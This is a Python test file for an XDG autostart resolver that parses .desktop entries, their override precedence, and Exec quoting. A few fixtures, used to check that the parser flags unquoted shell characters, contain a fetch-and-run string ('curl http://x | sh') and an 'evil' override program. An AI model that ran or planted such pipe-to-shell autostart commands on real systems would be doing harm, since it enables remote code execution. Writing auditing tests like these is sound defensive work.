"""Tests for the pure XDG autostart contract (#889)."""
from app import xdg_autostart as xa

USER = '/home/alice/.config/autostart'
SYSTEM = '/etc/xdg/autostart'


def _dir(path, files, scope='system', collected=True):
    return {'path': path, 'scope': scope, 'collected': collected,
            'files': [{'name': n, 'text': t, 'size': len(t.encode()) if t is not None else None} for n, t in files]}


def _entry(result, path):
    return next(e for e in result['entries'] if e['path'] == path)


APP = '[Desktop Entry]\nType=Application\nName=Updater\nExec=/usr/bin/updater --tray %U\n'


def test_enabled_entry_reports_program_and_argv_without_field_codes():
    result = xa.resolve_autostart([_dir(SYSTEM, [('updater.desktop', APP)])])
    entry = _entry(result, f'{SYSTEM}/updater.desktop')
    assert entry['status'] == 'enabled'
    assert entry['argv'] == ['/usr/bin/updater', '--tray']
    assert entry['program'] == '/usr/bin/updater'
    assert entry['scope'] == 'system'
    assert entry['gaps'] == [] and result['gaps'] == []
    assert result['contract_version'] == xa.CONTRACT_VERSION


def test_user_file_overrides_system_file_of_same_name():
    user = '[Desktop Entry]\nType=Application\nExec=/home/alice/bin/evil\n'
    result = xa.resolve_autostart([
        _dir(USER, [('updater.desktop', user)], scope='user'),
        _dir(SYSTEM, [('updater.desktop', APP)]),
    ])
    winner = _entry(result, f'{USER}/updater.desktop')
    shadowed = _entry(result, f'{SYSTEM}/updater.desktop')
    assert winner['status'] == 'enabled' and winner['program'] == '/home/alice/bin/evil'
    assert winner['overrides'] == [f'{SYSTEM}/updater.desktop']
    assert shadowed['status'] == 'overridden'
    assert shadowed['overridden_by'] == f'{USER}/updater.desktop'
    assert shadowed['argv'] is None


def test_hidden_user_file_suppresses_system_entry():
    result = xa.resolve_autostart([
        _dir(USER, [('updater.desktop', '[Desktop Entry]\nHidden=true\n')], scope='user'),
        _dir(SYSTEM, [('updater.desktop', APP)]),
    ])
    assert _entry(result, f'{USER}/updater.desktop')['status'] == 'hidden'
    assert _entry(result, f'{SYSTEM}/updater.desktop')['status'] == 'overridden'


def test_gnome_disabled_and_conditional_entries():
    disabled = APP + 'X-GNOME-Autostart-enabled=false\n'
    only = APP + 'OnlyShowIn=GNOME;Unity;\n'
    escaped = APP + 'NotShowIn=KDE\\;X;\n'
    tryexec = APP + 'TryExec=updater\n'
    result = xa.resolve_autostart([_dir(SYSTEM, [
        ('a.desktop', disabled), ('b.desktop', only), ('c.desktop', escaped), ('d.desktop', tryexec)])])
    assert _entry(result, f'{SYSTEM}/a.desktop')['status'] == 'disabled'
    b = _entry(result, f'{SYSTEM}/b.desktop')
    assert b['status'] == 'conditional' and b['only_show_in'] == ['GNOME', 'Unity']
    c = _entry(result, f'{SYSTEM}/c.desktop')
    assert c['status'] == 'conditional' and c['not_show_in'] == ['KDE;X']
    d = _entry(result, f'{SYSTEM}/d.desktop')
    assert d['status'] == 'conditional' and d['try_exec'] == 'updater'
    assert d['program'] == '/usr/bin/updater'


def test_invalid_entries():
    result = xa.resolve_autostart([_dir(SYSTEM, [
        ('nogroup.desktop', 'Type=Application\nExec=/bin/x\n'),
        ('link.desktop', '[Desktop Entry]\nType=Link\nURL=https://example.test\n'),
        ('noexec.desktop', '[Desktop Entry]\nType=Application\nName=X\n'),
    ])])
    for name in ('nogroup', 'link', 'noexec'):
        assert _entry(result, f'{SYSTEM}/{name}.desktop')['status'] == 'invalid'


def test_parser_ignores_other_groups_comments_localized_and_duplicate_keys():
    text = ('# comment\n[Desktop Action x]\nExec=/bin/other\n'
            '[Desktop Entry]\nType=Application\nName[de]=Aktualisierer\nName=Updater\n'
            'Exec=/bin/first\nExec=/bin/second\n')
    parsed = xa.parse_desktop_entry(text)
    assert parsed['keys']['Exec'] == '/bin/first'
    assert parsed['keys']['Name'] == 'Updater'
    assert 'Name[de]' not in parsed['keys']
    assert [g['kind'] for g in parsed['gaps']] == ['duplicate_key']


def test_exec_quoting_escapes_and_field_codes():
    parsed = xa.split_exec(r'"/opt/my app/run" --name "a \"b\" \$c" 100%% %i %c %k %f',
                           icon='upd', name='Updater', location='/etc/xdg/autostart/u.desktop')
    assert parsed['argv'] == ['/opt/my app/run', '--name', 'a "b" $c', '100%',
                              '--icon', 'upd', 'Updater', '/etc/xdg/autostart/u.desktop']
    assert parsed['gaps'] == []
    # General string escape \s is applied before Exec tokenizing.
    assert xa.split_exec(r'sh -c "echo\sone"')['argv'] == ['sh', '-c', 'echo one']


def test_exec_unbalanced_quote_and_unknown_codes_are_gaps():
    bad = xa.split_exec('"/bin/run --x')
    assert bad['argv'] is None and bad['gaps'][0]['kind'] == 'exec_unbalanced_quote'
    unknown = xa.split_exec('/bin/run %z --file=%f')
    assert unknown['argv'] == ['/bin/run', '--file=']
    assert {g['kind'] for g in unknown['gaps']} == {'exec_invalid_field_code', 'exec_embedded_field_code'}
    assert xa.split_exec('%f %U')['argv'] is None


def test_unbalanced_exec_is_reported_on_the_entry_without_argv():
    text = '[Desktop Entry]\nType=Application\nExec="/bin/run\n'
    result = xa.resolve_autostart([_dir(SYSTEM, [('u.desktop', text)])])
    entry = _entry(result, f'{SYSTEM}/u.desktop')
    assert entry['argv'] is None and entry['program'] is None
    assert any(g['kind'] == 'exec_unbalanced_quote' for g in entry['gaps'])


def test_uncollected_higher_directory_makes_precedence_uncertain():
    result = xa.resolve_autostart([
        _dir(USER, [], scope='user', collected=False),
        _dir(SYSTEM, [('updater.desktop', APP)]),
    ])
    entry = _entry(result, f'{SYSTEM}/updater.desktop')
    assert entry['status'] == 'enabled'
    assert [g['kind'] for g in entry['gaps']] == ['precedence_uncertain']
    assert result['gaps'][0]['kind'] == 'directory_not_collected'


def test_unreadable_oversized_invalid_names_and_entry_cap():
    big = '[Desktop Entry]\nType=Application\nExec=/bin/x\n' + '#' * (xa.MAX_FILE_BYTES + 1)
    directory = {'path': SYSTEM, 'scope': 'system', 'collected': True, 'files': [
        {'name': 'gone.desktop', 'text': None, 'error': 'permission denied'},
        {'name': 'big.desktop', 'text': big, 'size': len(big)},
        {'name': 'bad name.desktop', 'text': APP},
        {'name': 'notes.txt', 'text': APP},
    ]}
    result = xa.resolve_autostart([directory])
    assert _entry(result, f'{SYSTEM}/gone.desktop')['status'] == 'unknown'
    assert _entry(result, f'{SYSTEM}/big.desktop')['gaps'][0]['kind'] == 'file_too_large'
    assert [g['kind'] for g in result['gaps']] == ['invalid_name']
    assert all(not e['path'].endswith('notes.txt') for e in result['entries'])

    many = _dir(SYSTEM, [(f'e{i}.desktop', APP) for i in range(xa.MAX_ENTRIES + 3)])
    capped = xa.resolve_autostart([many])
    assert len(capped['entries']) == xa.MAX_ENTRIES
    assert capped['gaps'][-1]['kind'] == 'entries_truncated'


def test_long_values_are_not_used():
    text = '[Desktop Entry]\nType=Application\nExec=/bin/' + 'a' * xa.MAX_VALUE_CHARS + '\n'
    result = xa.resolve_autostart([_dir(SYSTEM, [('long.desktop', text)])])
    entry = _entry(result, f'{SYSTEM}/long.desktop')
    assert entry['status'] == 'invalid'
    assert any(g['kind'] == 'value_too_long' for g in entry['gaps'])


def test_unquoted_single_quotes_are_a_gap_not_a_wrong_argv():
    # GIO would run ['sh', '-c', 'curl http://x | sh']; never report the
    # naive whitespace split as an exact argv.
    text = "[Desktop Entry]\nType=Application\nExec=sh -c 'curl http://x | sh'\n"
    result = xa.resolve_autostart([_dir(SYSTEM, [('x.desktop', text)])])
    entry = _entry(result, f'{SYSTEM}/x.desktop')
    assert entry['argv'] is None and entry['program'] is None
    assert [g['kind'] for g in entry['gaps']] == ['exec_unquoted_reserved']
    assert entry['exec'] == "sh -c 'curl http://x | sh'"


def test_unquoted_backslash_is_a_gap():
    # File text "a\\\\ b" unescapes to "a\\ b": an unquoted backslash.
    parsed = xa.split_exec('foo a\\\\ b')
    assert parsed['argv'] is None and parsed['program'] is None
    assert [g['kind'] for g in parsed['gaps']] == ['exec_unquoted_reserved']


def test_each_unquoted_reserved_character_is_a_gap():
    for ch in "'\\><~|&;$*?#()`":
        parsed = xa.split_exec(f'foo a{ch}b')
        assert parsed['argv'] is None, ch
        assert parsed['gaps'][0]['kind'] == 'exec_unquoted_reserved', ch


def test_reserved_characters_inside_double_quotes_are_exact():
    parsed = xa.split_exec('sh -c "curl http://x | sh; echo \\\\$HOME"')
    assert parsed['gaps'] == []
    assert parsed['argv'] == ['sh', '-c', 'curl http://x | sh; echo $HOME']


def test_gnome_autostart_condition_is_conditional():
    text = APP + 'AutostartCondition=GSettings org.gnome.desktop.a11y.applications screen-reader-enabled\n'
    result = xa.resolve_autostart([_dir(SYSTEM, [('orca.desktop', text)])])
    entry = _entry(result, f'{SYSTEM}/orca.desktop')
    assert entry['status'] == 'conditional'
    assert entry['autostart_condition'].startswith('GSettings ')
    assert any('GNOME session manager extension' in r for r in entry['reasons'])
    assert entry['argv'] == ['/usr/bin/updater', '--tray']
